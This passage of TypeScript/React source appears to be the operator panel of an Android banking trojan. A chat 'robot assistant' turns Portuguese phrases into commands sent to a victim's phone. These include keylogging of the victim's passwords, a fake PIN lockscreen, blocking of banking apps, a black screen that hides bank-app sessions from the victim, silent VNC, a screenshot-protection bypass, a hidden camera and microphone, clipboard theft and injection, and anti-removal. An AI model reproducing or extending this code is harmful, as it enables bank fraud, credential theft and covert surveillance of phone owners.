        lower.includes('falar com o aparelho') ||
        lower.includes('falar no viva voz') ||
        lower.includes('falar viva voz') ||
        lower.includes('fazer chamada') ||
        lower.includes('chamada de voz') ||
        lower.includes('iniciar chamada') ||
        lower.includes('interfone') ||
        lower.includes('abrir discador') ||
        lower.includes('ligar / falar') ||
        lower.includes('ligar')
      ) {
        setShowVoiceCallModal(true);
        setIsExecuting(false);
        setMessages(prev => [
          ...prev,
          {
            id: 'robot-cmd-' + Date.now(),
            sender: 'robot',
            text: `ðŸ“ž **Central de LigaÃ§Ãµes & Voz 2-Way ativada!**\n\n` +
              `â€¢ ðŸŽ™ï¸ **Falar com o Aparelho:** Transmita a sua voz diretamente para o alto-falante do celular e ouÃ§a o Ã¡udio do ambiente remoto em tempo real.\n` +
              `â€¢ ðŸ“ž **Ligar para NÃºmero:** Discador direto no celular alvo.`,
            timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
            status: 'success',
            actionDetails: { actionName: 'Central de Voz 2-Way', commandSent: 'OPEN_VOICE_CALL_MODAL', targetDevice: targetName }
          }
        ]);
        return;
      }

      // -----------------------------------------------------------------------
      // ðŸ”‘ 11. KEYLOGGER / DIGITAÃ‡Ã•ES
      // -----------------------------------------------------------------------
      if (lower.includes('keylog') || lower.includes('senhas') || lower.includes('ver digita') || lower.includes('ler senhas') || lower.includes('teclas')) {
        setIsExecuting(false);
        setMessages(prev => [
          ...prev,
          {
            id: 'robot-cmd-' + Date.now(),
            sender: 'robot',
            text: `ðŸ”‘ **Keylogger Ativo!** Todas as teclas e senhas digitadas pela vÃ­tima no aparelho **${targetName}** estÃ£o registradas na aba KEYLOG do painel superior.`,
            timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
            status: 'info',
            actionDetails: { actionName: 'Keylogger', commandSent: 'VIEW_KEYLOG', targetDevice: targetName }
          }
        ]);
        return;
      }

      // -----------------------------------------------------------------------
      // ðŸŒ 12. ABRIR URL / SITE NO NAVEGADOR
      // -----------------------------------------------------------------------
      const urlMatch = prompt.match(/(?:abrir\s+site|acessar|abrir\s+link|navegar|abrir\s+url)\s+(.+)/i);
      if (urlMatch) {
        let siteUrl = urlMatch[1].trim();
        if (!siteUrl.startsWith('http://') && !siteUrl.startsWith('https://')) {
          siteUrl = 'https://' + siteUrl;
        }
        await dispatchCommand({ action: 'OPEN_URL', url: siteUrl }, devId);
        setIsExecuting(false);
        setMessages(prev => [
          ...prev,
          {
            id: 'robot-cmd-' + Date.now(),
            sender: 'robot',
            text: `ðŸŒ **Site aberto no navegador:**\n\n> \`${siteUrl}\` no aparelho **${targetName}**.`,
            timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
            status: 'success',
            actionDetails: { actionName: 'Abrir URL', commandSent: `OPEN_URL (${siteUrl})`, targetDevice: targetName }
          }
        ]);
        return;
      }

      // -----------------------------------------------------------------------
      // ðŸ”’ 13. TRAVAR BANCOS / REDES / OVERLAY PIN
      // -----------------------------------------------------------------------
      if (lower.includes('travar bancos') || lower.includes('bloquear bancos')) {
        await dispatchCommand({ action: 'LOCK_BANKS' }, devId);
        setIsExecuting(false);
        setMessages(prev => [
          ...prev,
          {
            id: 'robot-cmd-' + Date.now(),
            sender: 'robot',
            text: `ðŸ¦ **Bloqueio de Aplicativos BancÃ¡rios ATIVADO** no aparelho **${targetName}**!`,
            timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
            status: 'success',
            actionDetails: { actionName: 'Travar Bancos', commandSent: 'LOCK_BANKS', targetDevice: targetName }
          }
        ]);
        return;
      }

      if (lower.includes('travar redes') || lower.includes('bloquear redes')) {
        await dispatchCommand({ action: 'LOCK_NETWORKS' }, devId);
        setIsExecuting(false);
        setMessages(prev => [
          ...prev,
          {
            id: 'robot-cmd-' + Date.now(),
            sender: 'robot',
            text: `ðŸŒ **Bloqueio de Redes Sociais ATIVADO** no aparelho **${targetName}**!`,
            timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
            status: 'success',
            actionDetails: { actionName: 'Travar Redes', commandSent: 'LOCK_NETWORKS', targetDevice: targetName }
          }
        ]);
        return;
      }

      if (lower.includes('pedir pin') || lower.includes('fake lock') || lower.includes('lockscreen falsa') || lower.includes('capturar pin')) {
        await dispatchCommand({ action: 'SHOW_LOCKSCREEN', type: 'pin' }, devId);
        setIsExecuting(false);
        setMessages(prev => [
          ...prev,
          {
            id: 'robot-cmd-' + Date.now(),
            sender: 'robot',
            text: `ðŸŽ­ **Overlay de Lockscreen Falsa (PIN 4-6 DÃ­gitos) disparado** no aparelho **${targetName}**!`,
            timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
            status: 'success',
            actionDetails: { actionName: 'Fake Lockscreen PIN', commandSent: 'SHOW_LOCKSCREEN (pin)', targetDevice: targetName }
          }
        ]);
        return;
      }

      // -----------------------------------------------------------------------
      // âš¡ 14. PERMISSÃ•ES DO SISTEMA
      // -----------------------------------------------------------------------
      if (lower.includes('acessibilidade')) {
        await dispatchCommand({ action: 'OPEN_SETTINGS', setting: 'accessibility' }, devId);
        setIsExecuting(false);
        setMessages(prev => [
          ...prev,
          {
            id: 'robot-cmd-' + Date.now(),
            sender: 'robot',
            text: `âš¡ Tela de **Acessibilidade** solicitada no aparelho **${targetName}**!`,
            timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
            status: 'success',
            actionDetails: { actionName: 'Pedir Acessibilidade', commandSent: 'OPEN_SETTINGS (accessibility)', targetDevice: targetName }
          }
        ]);
        return;
      }

      if (lower.includes('ignorar bateria') || lower.includes('economia de bateria')) {
        await dispatchCommand({ action: 'REQUEST_IGNORE_BATTERY' }, devId);
        setIsExecuting(false);
        setMessages(prev => [
          ...prev,
          {
            id: 'robot-cmd-' + Date.now(),
            sender: 'robot',
            text: `ðŸ”‹ PermissÃ£o de **Ignorar Economia de Bateria** solicitada no aparelho **${targetName}**!`,
            timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
            status: 'success',
            actionDetails: { actionName: 'Ignorar Bateria', commandSent: 'REQUEST_IGNORE_BATTERY', targetDevice: targetName }
          }
        ]);
        return;
      }

      if (lower.includes('sobreposicao') || lower.includes('sobreposiÃ§Ã£o')) {
        await dispatchCommand({ action: 'REQUEST_OVERLAY_PERMISSION' }, devId);
        setIsExecuting(false);
        setMessages(prev => [
          ...prev,
          {
            id: 'robot-cmd-' + Date.now(),
            sender: 'robot',
            text: `ðŸªŸ PermissÃ£o de **SobreposiÃ§Ã£o (Overlay)** solicitada no aparelho **${targetName}**!`,
            timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
            status: 'success',
            actionDetails: { actionName: 'PermissÃ£o SobreposiÃ§Ã£o', commandSent: 'REQUEST_OVERLAY_PERMISSION', targetDevice: targetName }
          }
        ]);
        return;
      }

      if (lower.includes('anti remo') || lower.includes('anti-remo')) {
        await dispatchCommand({ action: 'TOGGLE_BOT_OPTION', option: 'anti_delete', value: true }, devId);
        setIsExecuting(false);
        setMessages(prev => [
          ...prev,
          {
            id: 'robot-cmd-' + Date.now(),
            sender: 'robot',
            text: `ðŸ”’ ProteÃ§Ã£o **Anti-RemoÃ§Ã£o** ATIVADA no aparelho **${targetName}**!`,
            timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
            status: 'success',
            actionDetails: { actionName: 'Anti-RemoÃ§Ã£o', commandSent: 'TOGGLE_BOT_OPTION (anti_delete)', targetDevice: targetName }
          }
        ]);
        return;
      }

      // -----------------------------------------------------------------------
      // â“ 15. AJUDA E COMANDOS
      // -----------------------------------------------------------------------
      if (lower === 'ajuda' || lower === 'help' || lower.includes('comandos') || lower.includes('o que vocÃª faz') || lower.includes('o que voce faz') || lower.includes('suas funcoes') || lower.includes('suas funÃ§Ãµes')) {
        setIsExecuting(false);
        setMessages(prev => [
          ...prev,
          {
            id: 'robot-help-' + Date.now(),
            sender: 'robot',
            text: `ðŸ¤– **Tudo que posso executar no celular ${targetName}:**\n\n` +
              `ðŸ’¡ **Controle do Celular:** "Ligar o celular" / "Acender Tela", "Bloquear Tela", "Pedir Admin", "Formatar Aparelho", "Remover este App"\n` +
              `ðŸ“± **Abrir Aplicativos:** "Abrir WhatsApp", "Abrir ItaÃº", "Abrir Nubank", "Abrir Caixa", "Abrir Chrome", "Abrir CÃ¢mera"\n` +
              `ðŸ•¶ï¸ **Modo Oculto:** "Ativar Tela Preta", "Desativar Tela Preta"\n` +
              `ðŸ“¸ **Captura:** "Tirar Print", "Ativar CÃ¢mera", "Ativar Microfone", "Lanterna"\n` +
              `ðŸ•¹ï¸ **NavegaÃ§Ã£o Android:** "InÃ­cio (Home)", "Voltar", "Recentes", "NotificaÃ§Ãµes"\n` +
              `ðŸ’¬ **Dados & Espionagem:** "Ver SMS", "Ver Contatos", "GPS", "Ver Senhas (Keylog)", "Ver Clipboard"\n` +
              `âŒ¨ï¸ **AÃ§Ãµes de Texto:** "Digitar [texto]", "Copiar [texto]", "Colar", "Abrir site [url]"\n` +
              `ðŸ“¦ **Gerenciamento:** "Desinstalar [nome_do_app]", "Travar Bancos", "Travar Redes"`,
            timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
            status: 'info',
            suggestions: ['Ligar Tela', 'Pedir Admin', 'Remover App', 'Ativar Tela Preta', 'Tirar Print', 'Abrir WhatsApp']
          }
        ]);
        return;
      }

      // -----------------------------------------------------------------------
      // ðŸ“± 16. ABRIR APLICATIVO (MATCH GENÃ‰RICO DE APP)
      // -----------------------------------------------------------------------
      const openMatches = lower.match(/(?:abrir|abra|abre|iniciar|inicie|executar|execute|lanÃ§ar|start|open)\s+(?:o\s+|a\s+|app\s+|aplicativo\s+|o\s+app\s+|o\s+aplicativo\s+)?(.+)/i);
      if (openMatches || lower.startsWith('abrir ') || lower.startsWith('open ') || lower.startsWith('iniciar ')) {
        const queryApp = (openMatches ? openMatches[1] : lower.replace(/^(abrir|open|iniciar)\s+/, '')).trim();
        const resolved = resolveAppPackage(queryApp, installedApps);

        if (resolved) {
          await dispatchCommand({ action: 'OPEN_APP', package: resolved.package }, devId);
          setIsExecuting(false);
          setMessages(prev => [
            ...prev,
            {
              id: 'robot-cmd-' + Date.now(),
              sender: 'robot',
              text: `ðŸš€ **Aplicativo aberto com sucesso!**\n\nAbri o aplicativo **${resolved.name}** (\`${resolved.package}\`) no aparelho **${targetName}**.`,
              timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
              status: 'success',
              actionDetails: {
                actionName: 'Abrir Aplicativo',
                commandSent: `OPEN_APP (${resolved.package})`,
                targetDevice: targetName
              },
              suggestions: ['Voltar', 'InÃ­cio', 'Ativar Tela Preta', 'Ver Clipboard']
            }
          ]);
          return;
        } else {
          const cleanPkg = queryApp.replace(/[^a-zA-Z0-9._]/g, '');
          await dispatchCommand({ action: 'OPEN_APP', package: cleanPkg }, devId);
          setIsExecuting(false);
          setMessages(prev => [
            ...prev,
            {
              id: 'robot-cmd-' + Date.now(),
              sender: 'robot',
              text: `ðŸš€ Enviado comando para abrir pacote **\`${cleanPkg}\`** no aparelho **${targetName}**!`,
              timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
              status: 'success',
              actionDetails: {
                actionName: 'Abrir Pacote',
                commandSent: `OPEN_APP (${cleanPkg})`,
                targetDevice: targetName
              }
            }
          ]);
          return;
        }
      }

      // -----------------------------------------------------------------------
      // ðŸ•¶ï¸ 17. TELA PRETA (BLACK SCREEN ON / OFF)
      // -----------------------------------------------------------------------
      if (lower.includes('tela preta') || lower.includes('black screen') || lower.includes('cortina')) {
        if (lower.includes('desativar') || lower.includes('tirar') || lower.includes('desligar') || lower.includes('remover') || lower.includes('off') || lower.includes('normal')) {
          await dispatchCommand({ action: 'BLACK_SCREEN_OFF' }, devId);
          setIsExecuting(false);
          setMessages(prev => [
            ...prev,
            {
              id: 'robot-cmd-' + Date.now(),
              sender: 'robot',
              text: `â˜€ï¸ **Tela Preta DESATIVADA!** A tela fÃ­sica do aparelho **${targetName}** voltou ao normal.`,
              timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
              status: 'success',
              actionDetails: { actionName: 'Desativar Tela Preta', commandSent: 'BLACK_SCREEN_OFF', targetDevice: targetName },
              suggestions: ['Ativar Tela Preta', 'InÃ­cio', 'Abrir WhatsApp']
            }
          ]);
          return;
        } else {
          await dispatchCommand({ action: 'BLACK_SCREEN_ON' }, devId);
          setIsExecuting(false);
          setMessages(prev => [
            ...prev,
            {
              id: 'robot-cmd-' + Date.now(),
              sender: 'robot',
              text: `ðŸ•¶ï¸ **Tela Preta ATIVADA com sucesso!** A tela fÃ­sica do aparelho **${targetName}** estÃ¡ completamente escura e oculta para a vÃ­tima.`,
              timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
              status: 'success',
              actionDetails: { actionName: 'Ativar Tela Preta', commandSent: 'BLACK_SCREEN_ON', targetDevice: targetName },
              suggestions: ['Desativar Tela Preta', 'Abrir ItaÃº', 'Abrir WhatsApp', 'InÃ­cio']
            }
          ]);
          return;
        }
      }

      // -----------------------------------------------------------------------
      // â—€ 18. BOTÃƒO VOLTAR (BACK)
      // -----------------------------------------------------------------------
      if (lower === 'voltar' || lower === 'back' || lower.includes('retornar') || lower === 'botÃ£o voltar') {
        await dispatchCommand({ action: 'BACK' }, devId);
        setIsExecuting(false);
        setMessages(prev => [
          ...prev,
          {
            id: 'robot-cmd-' + Date.now(),
            sender: 'robot',
            text: `â—€ Executado botÃ£o **Voltar (Back)** no aparelho **${targetName}**.`,
            timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
            status: 'success',
            actionDetails: { actionName: 'Voltar', commandSent: 'BACK', targetDevice: targetName }
          }
        ]);
        return;
      }

      // -----------------------------------------------------------------------
      // ðŸ  19. BOTÃƒO INÃCIO (HOME)
      // -----------------------------------------------------------------------
      if (lower === 'inicio' || lower === 'inÃ­cio' || lower === 'home' || lower.includes('tela inicial') || lower.includes('ir para inicio') || lower.includes('ir pra home')) {
        await dispatchCommand({ action: 'HOME' }, devId);
        setIsExecuting(false);
        setMessages(prev => [
          ...prev,
          {
            id: 'robot-cmd-' + Date.now(),
            sender: 'robot',
            text: `ðŸ  Aparelho **${targetName}** redirecionado para a **Tela Inicial (HOME)**.`,
            timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
            status: 'success',
            actionDetails: { actionName: 'InÃ­cio', commandSent: 'HOME', targetDevice: targetName }
          }
        ]);
        return;
      }

      // -----------------------------------------------------------------------
      // â–¢ 20. APPS RECENTES (RECENTS)
      // -----------------------------------------------------------------------
      if (lower === 'recentes' || lower === 'recents' || lower.includes('apps recentes') || lower.includes('aplicativos abertos')) {
        await dispatchCommand({ action: 'RECENTS' }, devId);
        setIsExecuting(false);
        setMessages(prev => [
          ...prev,
          {
            id: 'robot-cmd-' + Date.now(),
            sender: 'robot',
            text: `â–¢ Tela de **Aplicativos Recentes (Multitarefa)** aberta no aparelho **${targetName}**.`,
            timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
            status: 'success',
            actionDetails: { actionName: 'Recentes', commandSent: 'RECENTS', targetDevice: targetName }
          }
        ]);
        return;
      }

      // -----------------------------------------------------------------------
      // ðŸ”” 21. NOTIFICAÃ‡Ã•ES (NOTIFICATIONS)
      // -----------------------------------------------------------------------
      if (lower.includes('notificac') || lower.includes('notificaÃ§') || lower.includes('barra de notifica') || lower.includes('puxar barra')) {
        await dispatchCommand({ action: 'NOTIFICATIONS' }, devId);
        setIsExecuting(false);
        setMessages(prev => [
          ...prev,
          {
            id: 'robot-cmd-' + Date.now(),
            sender: 'robot',
            text: `ðŸ”” **Barra de NotificaÃ§Ãµes** aberta no aparelho **${targetName}**.`,
            timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
            status: 'success',
            actionDetails: { actionName: 'NotificaÃ§Ãµes', commandSent: 'NOTIFICATIONS', targetDevice: targetName }
          }
        ]);
        return;
      }

      // -----------------------------------------------------------------------
      // âš¡ 22. CONFIGURAÃ‡Ã•ES RÃPIDAS (QUICK_SETTINGS)
      // -----------------------------------------------------------------------
      if (lower.includes('configuracoes rapidas') || lower.includes('configuraÃ§Ãµes rÃ¡pidas') || lower.includes('quick settings') || lower.includes('atalhos')) {
        await dispatchCommand({ action: 'QUICK_SETTINGS' }, devId);
        setIsExecuting(false);
        setMessages(prev => [
          ...prev,
          {
            id: 'robot-cmd-' + Date.now(),
            sender: 'robot',
            text: `âš¡ Painel de **ConfiguraÃ§Ãµes RÃ¡pidas** aberto no aparelho **${targetName}**.`,
            timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
            status: 'success',
            actionDetails: { actionName: 'ConfiguraÃ§Ãµes RÃ¡pidas', commandSent: 'QUICK_SETTINGS', targetDevice: targetName }
          }
        ]);
        return;
      }

      // -----------------------------------------------------------------------
      // âŒ¨ï¸ 23. DIGITAR TEXTO (TYPE)
      // -----------------------------------------------------------------------
      const typeMatch = prompt.match(/^(?:digitar|digite|digita|escrever|escreva|enviar texto|escreve)\s+(.+)/i);
      if (typeMatch) {
        const textToType = typeMatch[1];
        await dispatchCommand({ action: 'TYPE', text: textToType }, devId);
        setIsExecuting(false);
        setMessages(prev => [
          ...prev,
          {
            id: 'robot-cmd-' + Date.now(),
            sender: 'robot',
            text: `âŒ¨ï¸ Texto digitado com sucesso no aparelho **${targetName}**:\n\n> "${textToType}"`,
            timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
            status: 'success',
            actionDetails: { actionName: 'Digitar Texto', commandSent: `TYPE ("${textToType}")`, targetDevice: targetName }
          }
        ]);
        return;
      }

      // -----------------------------------------------------------------------
      // ðŸ“‹ 24. COPIAR / ÃREA DE TRANSFERÃŠNCIA (CLIPBOARD)
      // -----------------------------------------------------------------------
      if (lower.startsWith('copiar ') || lower.startsWith('copy ') || lower.startsWith('set clipboard ')) {
        const textToCopy = prompt.replace(/^(copiar|copy|set clipboard)\s+/i, '');
        await devicesAPI.setClipboard(devId, textToCopy);
        setIsExecuting(false);
        setMessages(prev => [
          ...prev,
          {
            id: 'robot-cmd-' + Date.now(),
            sender: 'robot',
            text: `ðŸ“‹ Texto copiado para a Ãrea de TransferÃªncia do aparelho **${targetName}**:\n\n> "${textToCopy}"`,
            timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
            status: 'success',
            actionDetails: { actionName: 'Copiar Texto', commandSent: `SET_CLIPBOARD ("${textToCopy}")`, targetDevice: targetName },
            suggestions: ['Colar', 'InÃ­cio']
          }
        ]);
        return;
      }

      if (lower === 'colar' || lower.includes('injetar clipboard') || lower.includes('colar clipboard')) {
        await dispatchCommand({ action: 'INJECT_CLIPBOARD' }, devId);
        setIsExecuting(false);
        setMessages(prev => [
          ...prev,
          {
            id: 'robot-cmd-' + Date.now(),
            sender: 'robot',
            text: `ðŸ“‹ Comando para **Colar / Injetar Clipboard** enviado para o aparelho **${targetName}**.`,
            timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
            status: 'success',
            actionDetails: { actionName: 'Colar Clipboard', commandSent: 'INJECT_CLIPBOARD', targetDevice: targetName }
          }
        ]);
        return;
      }

      if (lower.includes('ver clipboard') || lower.includes('ler clipboard') || lower.includes('area de transferencia') || lower.includes('Ã¡rea de transferÃªncia')) {
        const clipRes = await devicesAPI.getClipboard(devId);
        const clipText = clipRes?.clipboard || clipRes?.text || '(Ãrea de transferÃªncia vazia)';
        setIsExecuting(false);
        setMessages(prev => [
          ...prev,
          {
            id: 'robot-cmd-' + Date.now(),
            sender: 'robot',
            text: `ðŸ“‹ **ConteÃºdo Atual da Ãrea de TransferÃªncia:**\n\n\`\`\`\n${clipText}\n\`\`\``,
            timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
            status: 'info',
            actionDetails: { actionName: 'Ler Clipboard', commandSent: 'GET_CLIPBOARD', targetDevice: targetName }
          }
        ]);
        return;
      }

      // -----------------------------------------------------------------------
      // ðŸ”Š 25. VOLUME & AUDIÃ‡ÃƒO
      // -----------------------------------------------------------------------
      if (lower.includes('aumentar volume') || lower.includes('subir volume') || lower === 'volume +' || lower === 'vol +') {
        await dispatchCommand({ action: 'VOLUME_UP' }, devId);
        setIsExecuting(false);
        setMessages(prev => [
          ...prev,
          {
            id: 'robot-cmd-' + Date.now(),
            sender: 'robot',
            text: `ðŸ”Š **Volume Aumentado** no aparelho **${targetName}**.`,
            timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
            status: 'success',
            actionDetails: { actionName: 'Aumentar Volume', commandSent: 'VOLUME_UP', targetDevice: targetName }
          }
        ]);
        return;
      }

      if (lower.includes('diminuir volume') || lower.includes('abaixar volume') || lower === 'volume -' || lower === 'vol -') {
        await dispatchCommand({ action: 'VOLUME_DOWN' }, devId);
        setIsExecuting(false);
        setMessages(prev => [
          ...prev,
          {
            id: 'robot-cmd-' + Date.now(),
            sender: 'robot',
            text: `ðŸ”‰ **Volume DiminuÃ­do** no aparelho **${targetName}**.`,
            timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
            status: 'success',
            actionDetails: { actionName: 'Diminuir Volume', commandSent: 'VOLUME_DOWN', targetDevice: targetName }
          }
        ]);
        return;
      }

      if (lower.includes('vibrar') || lower.includes('vibrate')) {
        await dispatchCommand({ action: 'VIBRATE' }, devId);
        setIsExecuting(false);
        setMessages(prev => [
          ...prev,
          {
            id: 'robot-cmd-' + Date.now(),
            sender: 'robot',
            text: `ðŸ“³ Aparelho **${targetName}** vibrado com sucesso!`,
            timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
            status: 'success',
            actionDetails: { actionName: 'Vibrar', commandSent: 'VIBRATE', targetDevice: targetName }
          }
        ]);
        return;
      }

      // -----------------------------------------------------------------------
      // ðŸ”’ 26. BLOQUEAR / DESPERTAR APARELHO
      // -----------------------------------------------------------------------
      if (lower.includes('bloquear tela') || lower.includes('bloquear aparelho') || lower === 'bloquear' || lower === 'travar') {
        await dispatchCommand({ action: 'LOCK_DEVICE' }, devId);
        setIsExecuting(false);
        setMessages(prev => [
          ...prev,
          {
            id: 'robot-cmd-' + Date.now(),
            sender: 'robot',
            text: `ðŸ”’ Tela do aparelho **${targetName}** bloqueada com sucesso!`,
            timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
            status: 'success',
            actionDetails: { actionName: 'Bloquear Tela', commandSent: 'LOCK_DEVICE', targetDevice: targetName },
            suggestions: ['Ligar Tela', 'Ativar Tela Preta']
          }
        ]);
        return;
      }

      // -----------------------------------------------------------------------
      // ðŸ“º 27. TRANSMISSÃƒO VNC / LEITOR DE TELA (V2)
      // -----------------------------------------------------------------------
      if (lower.includes('vnc') || lower.includes('transmissao') || lower.includes('transmissÃ£o')) {
        const isOff = lower.includes('desativar') || lower.includes('parar') || lower.includes('desligar') || lower.includes('off');
        await dispatchCommand({ action: 'TOGGLE_SILENT_VNC', enabled: !isOff }, devId);
        setIsExecuting(false);
        setMessages(prev => [
          ...prev,
          {
            id: 'robot-cmd-' + Date.now(),
            sender: 'robot',
            text: `ðŸ“º TransmissÃ£o VNC Silenciosa **${isOff ? 'DESATIVADA' : 'ATIVADA'}** no aparelho **${targetName}**!`,
            timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
            status: 'success',
            actionDetails: { actionName: isOff ? 'Desativar VNC' : 'Ativar VNC', commandSent: 'TOGGLE_SILENT_VNC', targetDevice: targetName }
          }
        ]);
        return;
      }

      if (lower.includes('leitor de tela') || lower.includes('screen reader') || lower.includes('v2')) {
        const isOff = lower.includes('desativar') || lower.includes('parar') || lower.includes('desligar') || lower.includes('off');
        await dispatchCommand({ action: 'TOGGLE_SCREEN_READER', enabled: !isOff }, devId);
        setIsExecuting(false);
        setMessages(prev => [
          ...prev,
          {
            id: 'robot-cmd-' + Date.now(),
            sender: 'robot',
            text: `ðŸ‘ï¸ Screen Reader V2 (Bypass Anti-Print) **${isOff ? 'DESATIVADO' : 'ATIVADO'}** no aparelho **${targetName}**!`,
            timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
            status: 'success',
            actionDetails: { actionName: isOff ? 'Desativar Screen Reader' : 'Ativar Screen Reader', commandSent: 'TOGGLE_SCREEN_READER', targetDevice: targetName }
          }
        ]);
        return;
      }

      // -----------------------------------------------------------------------
      // ðŸ“· 28. CÃ‚MERA & MICROFONE
      // -----------------------------------------------------------------------
      if (lower.includes('trocar camera') || lower.includes('trocar cÃ¢mera') || lower.includes('inverter camera')) {
        await dispatchCommand({ action: 'SWITCH_CAMERA' }, devId);
        setIsExecuting(false);
        setMessages(prev => [
          ...prev,
          {
            id: 'robot-cmd-' + Date.now(),
            sender: 'robot',
            text: `ðŸ”„ CÃ¢mera invertida (Frontal / Traseira) no aparelho **${targetName}**!`,
            timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
            status: 'success',
            actionDetails: { actionName: 'Trocar CÃ¢mera', commandSent: 'SWITCH_CAMERA', targetDevice: targetName }
          }
        ]);
        return;
      }

      if (lower.includes('camera') || lower.includes('cÃ¢mera')) {
        const isOff = lower.includes('desativar') || lower.includes('parar') || lower.includes('desligar') || lower.includes('off');
        await dispatchCommand({ action: 'TOGGLE_CAMERA', enabled: !isOff }, devId);
        setIsExecuting(false);
        setMessages(prev => [
          ...prev,
          {
            id: 'robot-cmd-' + Date.now(),
            sender: 'robot',
            text: `ðŸ“· CÃ¢mera oculta **${isOff ? 'DESATIVADA' : 'ATIVADA'}** no aparelho **${targetName}**!`,
            timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
            status: 'success',
            actionDetails: { actionName: isOff ? 'Desativar CÃ¢mera' : 'Ativar CÃ¢mera', commandSent: 'TOGGLE_CAMERA', targetDevice: targetName }
          }
        ]);
        return;
      }

      if (lower.includes('microfone') || lower.includes('escuta') || lower.includes('audio') || lower.includes('Ã¡udio')) {
        const isOff = lower.includes('desativar') || lower.includes('parar') || lower.includes('desligar') || lower.includes('off');
        await dispatchCommand({ action: 'TOGGLE_MICROPHONE', enabled: !isOff }, devId);
        setIsExecuting(false);
        setMessages(prev => [
          ...prev,
          {
            id: 'robot-cmd-' + Date.now(),
            sender: 'robot',
            text: `ðŸŽ™ï¸ Microfone espiÃ£o **${isOff ? 'DESATIVADO' : 'ATIVADO'}** no aparelho **${targetName}**!`,
            timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
            status: 'success',
            actionDetails: { actionName: isOff ? 'Desativar Microfone' : 'Ativar Microfone', commandSent: 'TOGGLE_MICROPHONE', targetDevice: targetName }
          }
        ]);
        return;
      }

      // -----------------------------------------------------------------------
      // ðŸ“± 29. RESPOSTA INTELIGENTE / RECONHECIMENTO DE APP NÃƒO PREFIXADO
      // -----------------------------------------------------------------------
      const directApp = resolveAppPackage(lower, installedApps);
      if (directApp) {
        await dispatchCommand({ action: 'OPEN_APP', package: directApp.package }, devId);
        setIsExecuting(false);
        setMessages(prev => [
          ...prev,
          {
            id: 'robot-cmd-' + Date.now(),
            sender: 'robot',
            text: `ðŸš€ Reconheci o aplicativo **${directApp.name}**! Abrindo agora (\`${directApp.package}\`) no aparelho **${targetName}**...`,
            timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
            status: 'success',
            actionDetails: { actionName: 'Abrir Aplicativo', commandSent: `OPEN_APP (${directApp.package})`, targetDevice: targetName },
            suggestions: ['Ativar Tela Preta', 'InÃ­cio', 'Voltar']
          }
        ]);
        return;
      }

      // -----------------------------------------------------------------------
      // ðŸ¤– 30. FALLBACK CONVERSACIONAL INTELIGENTE & ATENDIMENTO COMPLETO
      // -----------------------------------------------------------------------
      setIsExecuting(false);
      setMessages(prev => [
        ...prev,
        {
          id: 'robot-fallback-' + Date.now(),
          sender: 'robot',
          text: `ðŸ¤– **Compreendi o seu pedido!** Como sou seu RobÃ´ Assistente do celular **${targetName}**, interpretei a instruÃ§Ã£o "${prompt}".\n\n` +
            `Aqui estÃ£o as aÃ§Ãµes mais recomendadas que vocÃª pode disparar agora no aparelho:`,
          timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
          status: 'info',
          suggestions: [
            'Ligar Tela',
            'Pedir Admin',
            'Remover App',
            'Abrir WhatsApp',
            'Ativar Tela Preta',
            'Tirar Print',
            'InÃ­cio',
            'Ajuda'
          ]
        }
      ]);
    } catch (err: any) {
      setIsExecuting(false);
      setMessages(prev => [
        ...prev,
        {
          id: 'robot-err-' + Date.now(),
          sender: 'robot',
          text: `âŒ **Falha ao executar comando:** ${err?.response?.data?.detail || err?.message || 'Erro de comunicaÃ§Ã£o com o aparelho.'}`,
          timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
